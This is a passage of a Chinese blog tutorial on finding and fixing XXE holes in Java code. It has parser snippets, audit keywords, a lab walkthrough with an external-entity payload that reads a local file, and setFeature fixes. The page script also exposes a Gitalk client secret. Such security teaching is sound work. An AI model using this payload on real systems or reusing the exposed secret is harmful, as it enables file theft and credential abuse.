+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">File</span><span class="w"> </span><span class="n">file</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">File</span><span class="p">(</span><span class="s">&#34;oob.xml&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">InputStream</span><span class="w"> </span><span class="n">inputStream</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">FileInputStream</span><span class="p">(</span><span class="n">file</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">SAXTransformerFactory</span><span class="w"> </span><span class="n">factory</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">SAXTransformerFactory</span><span class="p">)</span><span class="w"> </span><span class="n">SAXTransformerFactory</span><span class="p">.</span><span class="na">newInstance</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">StreamSource</span><span class="w"> </span><span class="n">source</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">StreamSource</span><span class="p">(</span><span class="n">inputStream</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">factory</span><span class="p">.</span><span class="na">newTransformerHandler</span><span class="p">(</span><span class="n">source</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="8schema">8.Schema</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl">import javax.xml.XMLConstants;
+</span></span><span class="line"><span class="cl">import javax.xml.transform.Source;
+</span></span><span class="line"><span class="cl">import javax.xml.transform.stream.StreamSource;
+</span></span><span class="line"><span class="cl">import javax.xml.validation.SchemaFactory;
+</span></span><span class="line"><span class="cl">import java.io.File;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">public class Schema {
+</span></span><span class="line"><span class="cl">    public static void main(String[] args) throws Exception{
+</span></span><span class="line"><span class="cl">        File file = new File(&#34;oob.xml&#34;);
+</span></span><span class="line"><span class="cl">        SchemaFactory schemaFactory = SchemaFactory.newInstance(XMLConstants.W3C_XML_SCHEMA_NS_URI);
+</span></span><span class="line"><span class="cl">        Source source = new StreamSource(file);
+</span></span><span class="line"><span class="cl">        schemaFactory.newSchema(source);
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="9transformer">9.Transformer</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">import javax.xml.transform.TransformerFactory;
+</span></span><span class="line"><span class="cl">import javax.xml.transform.dom.DOMResult;
+</span></span><span class="line"><span class="cl">import javax.xml.transform.stream.StreamSource;
+</span></span><span class="line"><span class="cl">import java.io.File;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">public class Transformer {
+</span></span><span class="line"><span class="cl">    public static void main(String[] args) throws Exception {
+</span></span><span class="line"><span class="cl">        File file = new File(&#34;oob.xml&#34;);
+</span></span><span class="line"><span class="cl">        TransformerFactory factory = TransformerFactory.newInstance();
+</span></span><span class="line"><span class="cl">        StreamSource source = new StreamSource(file);
+</span></span><span class="line"><span class="cl">        factory.newTransformer().transform(source, new DOMResult());
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="10unmarshaller">10.Unmarshaller</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">javax.xml.bind.JAXBContext</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javax.xml.bind.Unmarshaller</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.File</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">Unmarsh</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">File</span><span class="w"> </span><span class="n">file</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">File</span><span class="p">(</span><span class="s">&#34;oob.xml&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Class</span><span class="w"> </span><span class="n">tclass</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Unmarsh</span><span class="p">.</span><span class="na">class</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">JAXBContext</span><span class="w"> </span><span class="n">context</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">JAXBContext</span><span class="p">.</span><span class="na">newInstance</span><span class="p">(</span><span class="n">tclass</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Unmarshaller</span><span class="w"> </span><span class="n">unmarshaller</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">context</span><span class="p">.</span><span class="na">createUnmarshaller</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Object</span><span class="w"> </span><span class="n">obj</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">unmarshaller</span><span class="p">.</span><span class="na">unmarshal</span><span class="p">(</span><span class="n">file</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">tclass</span><span class="p">.</span><span class="na">cast</span><span class="p">(</span><span class="n">obj</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="11validatorsample">11.ValidatorSample</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">import javax.xml.transform.Source;
+</span></span><span class="line"><span class="cl">import javax.xml.validation.Schema;
+</span></span><span class="line"><span class="cl">import javax.xml.validation.SchemaFactory;
+</span></span><span class="line"><span class="cl">import javax.xml.validation.Validator;
+</span></span><span class="line"><span class="cl">import java.io.File;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">public class ValidatorSample {
+</span></span><span class="line"><span class="cl">    public static void main(String[] args) throws Exception{
+</span></span><span class="line"><span class="cl">        File file = new File(&#34;oob.xml&#34;);
+</span></span><span class="line"><span class="cl">        SchemaFactory factory = SchemaFactory.newInstance(&#34;http://www.w3.org/2001/XMLSchema&#34;);
+</span></span><span class="line"><span class="cl">        Schema schema = factory.newSchema();
+</span></span><span class="line"><span class="cl">        Validator validator = schema.newValidator();
+</span></span><span class="line"><span class="cl">        validator.validate((Source) file);
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="挖掘技巧">挖掘技巧</h3>
+<p>挖掘XXE漏洞的关键是找到：</p>
+<p><strong>代码是否涉及xml解析(找这些关键字)——&gt;xml输入是否是外部可控——&gt;是否禁用外部实体（DTD）</strong></p>
+<p>若三个条件满足则存在漏洞。</p>
+<h3 id="审计关键字">审计关键字</h3>
+<blockquote>
+<p>可以只搜索包的点的最后一部分，或者pom.xml中看到引入的第三方库</p>
+<p>比较简单，看到解析XML的代码，并且没有setFeature禁用外部实体，那大可能就会有该漏</p>
+</blockquote>
+<p>和其他漏洞一样，只不过审计时候搜索的关键字不同，搜索<strong>常见关键字</strong>以快速对代码进行定位：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">DocumentHelper
+</span></span><span class="line"><span class="cl">DocumentHelper.parseText
+</span></span><span class="line"><span class="cl">java.beans.XMLDecoder
+</span></span><span class="line"><span class="cl">javax.xml.bind.Unmarshaller   //使用默认的解析方法不会存在XXE问题，这也是唯一一个使用默认的解析方法不会存在XXE的一个库。
+</span></span><span class="line"><span class="cl">Unmarshaller
+</span></span><span class="line"><span class="cl">javax.xml.parsers.DocumentBuilder    // DoM解析
+</span></span><span class="line"><span class="cl">javax.xml.parsers.DocumentBuilderFactory
+</span></span><span class="line"><span class="cl">DocumentBuilder
+</span></span><span class="line"><span class="cl">DocumentBuilderFactory
+</span></span><span class="line"><span class="cl">javax.xml.parsers.SAXParser    //SAX解析
+</span></span><span class="line"><span class="cl">javax.xml.stream.XMLInputFactory
+</span></span><span class="line"><span class="cl">javax.xml.stream.XMLStreamReader
+</span></span><span class="line"><span class="cl">XMLStreamReader
+</span></span><span class="line"><span class="cl">javax.xml.transform.sax.SAXSource
+</span></span><span class="line"><span class="cl">javax.xml.transform.sax.SAXSource 
+</span></span><span class="line"><span class="cl">javax.xml.transform.sax.SAXTransformerFactory    //SAXTransformerFactory
+</span></span><span class="line"><span class="cl">SAXTransformerFactory
+</span></span><span class="line"><span class="cl">javax.xml.transform.TransformerFactory
+</span></span><span class="line"><span class="cl">TransformerFactory
+</span></span><span class="line"><span class="cl">javax.xml.validation.SchemaFactory    //SchemaFactory
+</span></span><span class="line"><span class="cl">SchemaFactory
+</span></span><span class="line"><span class="cl">javax.xml.validation.Validator
+</span></span><span class="line"><span class="cl">javax.xml.xpath.XPathExpression
+</span></span><span class="line"><span class="cl">XPathExpression
+</span></span><span class="line"><span class="cl">newSAXParser
+</span></span><span class="line"><span class="cl">oracle.xml.parser.v2.XMLParser
+</span></span><span class="line"><span class="cl">org.apache.commons.digester.Digester      //Digester解析
+</span></span><span class="line"><span class="cl">org.apache.commons.digester3.Digester
+</span></span><span class="line"><span class="cl">Digester
+</span></span><span class="line"><span class="cl">org.dom4j.DocumentHelper
+</span></span><span class="line"><span class="cl">org.dom4j.io.SAXReader   //dom4j解析
+</span></span><span class="line"><span class="cl">SAXReader
+</span></span><span class="line"><span class="cl">org.jdom.input.SAXBuilder  //JDOM解析
+</span></span><span class="line"><span class="cl">org.jdom.output.XMLOutputter
+</span></span><span class="line"><span class="cl">org.jdom2.input.SAXBuilder
+</span></span><span class="line"><span class="cl">SAXBuilder
+</span></span><span class="line"><span class="cl">org.xml.sax.helpers.XMLReaderFactory
+</span></span><span class="line"><span class="cl">XMLReaderFactory
+</span></span><span class="line"><span class="cl">org.xml.sax.XMLReader
+</span></span><span class="line"><span class="cl">XMLReader
+</span></span><span class="line"><span class="cl">createXMLReader
+</span></span><span class="line"><span class="cl">org.xml.sax.SAXParseExceptionpublicId
+</span></span><span class="line"><span class="cl">SAXParserFactory     //SAXParserFactory
+</span></span><span class="line"><span class="cl">SAXSource
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="例子">例子</h3>
+<p>这里以Hello-Java-Sec为简单例子说明</p>
+<p>搜索关键字发现使用了<code>DocumentBuilderFactory.newInstance()</code></p>
+<p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240705215111345.png"
+    data-srcset="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240705215111345.png, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240705215111345.png 1.5x, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240705215111345.png 2x"
+    data-sizes="auto"
+    alt="image-20240705215111345"
+    title="image-20240705215111345"/></p>
+<p>进入代码查看xml是否可控</p>
+<p>可以发现：程序首先通过<code>DocumentBuilderFactory.newInstance()</code>来获取一个实例，然后通过<code>DocumentBuilder::parse</code>来解析</p>
+<p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240705215234206.png"
+    data-srcset="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240705215234206.png, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240705215234206.png 1.5x, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240705215234206.png 2x"
+    data-sizes="auto"
+    alt="image-20240705215234206"
+    title="image-20240705215234206"/></p>
+<p>继续跟进，发现直接通过<code>getValueByTagName</code>函数获取了person节点的内容并在进行对比数据后将其输出到页面上。也就是说可以通过控制person的值来达到回显xxe的目的。</p>
+<p>构造payload：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="cp">&lt;?xml version = &#34;1.0&#34;?&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE ANY [
+</span></span></span><span class="line"><span class="cl"><span class="cp">    &lt;!ENTITY f SYSTEM &#34;file:///d://index.txt&#34;&gt;</span>
+</span></span><span class="line"><span class="cl">]&gt;
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;person&gt;&lt;name&gt;</span><span class="ni">&amp;f;</span><span class="nt">&lt;/name&gt;&lt;password&gt;</span>admin888<span class="nt">&lt;/password&gt;&lt;/person&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240705215535839.png"
+    data-srcset="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240705215535839.png, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240705215535839.png 1.5x, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240705215535839.png 2x"
+    data-sizes="auto"
+    alt="image-20240705215535839"
+    title="image-20240705215535839"/></p>
+<p>成功读取文件</p>
+<h2 id="漏洞防御">漏洞防御</h2>
+<ul>
+<li>
+<p>使用XML解析器时需要设置其属性，禁止使用外部实体</p>
+<ul>
+<li>
+<p>禁用外部实体之后能解决绝大部分的安全问题</p>
+<ul>
+<li>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">//实例化解析类之后常用的禁用外部实体的方法</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">obj</span><span class="p">.</span><span class="na">setFeature</span><span class="p">(</span><span class="s">&#34;http://apache.org/xml/features/disallow-doctype-decl&#34;</span><span class="p">,</span><span class="kc">true</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">obj</span><span class="p">.</span><span class="na">setFeature</span><span class="p">(</span><span class="s">&#34;http://xml.org/sax/features/external-general-entities&#34;</span><span class="p">,</span><span class="kc">false</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">obj</span><span class="p">.</span><span class="na">setFeature</span><span class="p">(</span><span class="s">&#34;http://xml.org/sax/features/external-parameter-entities&#34;</span><span class="p">,</span><span class="kc">false</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">// 注意，不同解析库的修复方案不同</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+</ul>
+</li>
+<li>
+<p>但是不同库的禁止方法略微有不同，具体可以参考这篇文章：<a href="https://blog.spoock.com/2018/10/23/java-xxe"target="_blank" rel="external nofollow noopener noreferrer">Java中不同库的修复方法<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a></p>
+</li>
+</ul>
+</li>
+<li>
+<p>手动黑名单过滤</p>
+</li>
+<li>
+<p>许多第三方组件会爆出xxe漏洞，应避免引入这些组件</p>
+</li>
+</ul>
+<h2 id="参考文章">参考文章</h2>
+<p><a href="https://mp.weixin.qq.com/s?__biz=MzI3MTQyNzQxMA==&amp;mid=2247484073&amp;idx=1&amp;sn=483c6a12a0813dc3d608782f455a14e3&amp;chksm=eac0b094ddb7398279a61a6ce506e45a2d89f8db19b5f5a64023ad915c9ffebe405171334919&amp;scene=21#wechat_redirect"target="_blank" rel="external nofollow noopener noreferrer">https://mp.weixin.qq.com/s?__biz=MzI3MTQyNzQxMA==&mid=2247484073&idx=1&sn=483c6a12a0813dc3d608782f455a14e3&chksm=eac0b094ddb7398279a61a6ce506e45a2d89f8db19b5f5a64023ad915c9ffebe405171334919&scene=21#wechat_redirect<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a></p>
+<p><a href="https://yoga7xm.top/2020/02/17/javaxxe/"target="_blank" rel="external nofollow noopener noreferrer">https://yoga7xm.top/2020/02/17/javaxxe/<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a></p>
+<p><a href="https://www.mi1k7ea.com/2019/02/13/XML%E6%B3%A8%E5%85%A5%E4%B9%8BDocumentBuilder/#0x03-XML%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81"target="_blank" rel="external nofollow noopener noreferrer">https://www.mi1k7ea.com/2019/02/13/XML%E6%B3%A8%E5%85%A5%E4%B9%8BDocumentBuilder/#0x03-XML%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a></p>
+<p><a href="https://xz.aliyun.com/t/3357"target="_blank" rel="external nofollow noopener noreferrer">https://xz.aliyun.com/t/3357<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a></p>
+</div><div class="post-footer" id="post-footer">
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod">
+        <span title=2024-07-05&#32;14:00:50>更新于 2024-07-05&nbsp;</span>
+      </div><div class="post-info-license">
+          <span><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span>
+        </div></div>
+    <div class="post-info-line">
+      <div class="post-info-md"><span><a href="/xxe%E6%BC%8F%E6%B4%9E/index.md" title="阅读原始文档" class="link-to-markdown">阅读原始文档</a></span></div>
+      <div class="post-info-share">
+        <span></span>
+      </div>
+    </div>
+  </div>
+
+  <div class="post-info-more">
+    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href='/tags/xxe/' class="post-tag">XXE</a><a href='/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/' class="post-tag">代码审计</a></section>
+    <section>
+      <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+    </section>
+  </div>
+
+  <div class="post-nav"><a href="/commonscollections6%E5%88%A9%E7%94%A8%E9%93%BE%E5%AD%A6%E4%B9%A0/" class="post-nav-item" rel="prev" title="CommonsCollections6利用链学习"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>CommonsCollections6利用链学习</a></div>
+</div>
+<div id="comments"><div id="gitalk" class="comment"></div><noscript>
+        Please enable JavaScript to view the comments powered by <a href="https://github.com/gitalk/gitalk" rel="external nofollow noopener noreferrer">Gitalk</a>.
+      </noscript></div></article></main><footer class="footer">
+    <div class="footer-container"><div class="footer-line powered">由 <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.128.2">Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.2.17-RC"><img class="fixit-icon" src="/fixit.min.svg" alt="FixIt logo" />&nbsp;FixIt</a>
+        </div><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
+            <span itemprop="copyrightYear">2019 - 2024</span><span class="author" itemprop="copyrightHolder">
+              <a href="http://shuai06.github.io"target="_blank" rel="external nofollow noopener noreferrer">剑胆琴心</a></span><span class="license footer-divider"><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div></div>
+  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="回到顶部"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric">0%</span>
+        </div><div class="fixed-button view-comments d-none" role="button" aria-label="查看评论"><i class="fa-solid fa-comment fa-fw" aria-hidden="true"></i></div></div><div id="mask"></div><div class="reading-progress-bar" style="left: 0;top: 0;--bg-progress: #000;--bg-progress-dark: #fff;"></div><noscript>
+    <div class="noscript-warning">FixIt 主题在启用 JavaScript 的情况下效果最佳。</div>
+  </noscript>
+</div><link rel="stylesheet" href="/lib/gitalk/gitalk.min.css"><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><link rel="stylesheet" href="/lib/pace/themes/blue/pace-theme-minimal.css"><script src="/lib/gitalk/gitalk.min.js"></script><script src="/lib/autocomplete/autocomplete.min.js" defer></script><script src="/lib/lunr/lunr.min.js" defer></script><script src="/lib/lunr/lunr.stemmer.support.min.js" defer></script><script src="/lib/lunr/lunr.zh.min.js" defer></script><script src="/lib/lazysizes/lazysizes.min.js" async defer></script><script src="/lib/katex/katex.min.js" defer></script><script src="/lib/katex/auto-render.min.js" defer></script><script src="/lib/katex/copy-tex.min.js" defer></script><script src="/lib/katex/mhchem.min.js" defer></script><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script src="/lib/pangu/pangu.min.js" defer></script><script src="/lib/cell-watermark/watermark.min.js" defer></script><script src="/lib/pace/pace.min.js" async defer></script><script>window.config={"autoBookmark":true,"code":{"copyTitle":"复制到剪贴板","editLockTitle":"锁定可编辑代码块","editUnLockTitle":"解锁可编辑代码块","editable":true,"maxShownLines":10},"comment":{"enable":true,"expired":false,"gitalk":{"admin":["shuai06"],"clientID":"d75ec1a5864747376f6f","clientSecret":"1b354dc131534bb3b7511213c74d3f9116a03a79","id":"2024-07-05T21:55:45+08:00","owner":"shuai06","repo":"hexo-gitalk","title":"XXE漏洞"}},"cookieconsent":{"content":{"dismiss":"同意","link":"了解更多","message":"本网站使用 Cookies 来改善您的浏览体验。"},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"enablePWA":true,"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"pangu":{"enable":true,"selector":"article"},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","lunrLanguageCode":"zh","lunrSegmentitURL":"/lib/lunr/lunr.segmentit.js","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"lunr"},"watermark":{"appendto":".wrapper\u003emain","colspacing":30,"content":"\u003cimg class=\"fixit-icon\" src=\"/images/avatar.png\" alt=\"FixIt logo\" /\u003e 剑胆琴心","enable":true,"fontfamily":"inherit","fontsize":0.85,"height":21,"opacity":0.0125,"rotate":15,"rowspacing":60,"width":150}};</script><script src="/js/theme.min.js" defer></script><script src="/js/custom.min.js" defer></script></body>
+</html>
